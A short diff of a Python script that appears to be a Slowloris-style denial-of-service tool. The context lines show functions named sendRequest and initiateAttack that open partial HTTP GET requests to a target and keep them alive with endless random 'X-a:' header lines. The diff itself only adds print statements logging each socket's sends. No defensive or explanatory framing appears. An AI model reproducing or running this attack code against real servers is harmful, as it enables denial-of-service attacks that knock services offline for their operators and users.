@@ -13,6 +13,9 @@ SOCKET_CONNECTIONS = []
 
 def sendRequest():
     for s in SOCKET_CONNECTIONS:
+
+        print(str(s.getsockname()) + " is sending GET REQUEST!") 
+
         s.send(str.encode("GET / HTTP/1.1\r\n"))
 
         for header in STANDARD_GET_REQUEST_HEADERS:
@@ -33,6 +36,7 @@ def initiateAttack(ip, port):
     while True:
         for connection in SOCKET_CONNECTIONS:
             try:
+                print(str(connection.getsockname()) + " is sending extra data!") 
                 connection.send(str.encode("X-a: {}\r\n".format(random.choice(string.ascii_letters))))
             except socket.error:
                 SOCKET_CONNECTIONS.remove(connection)
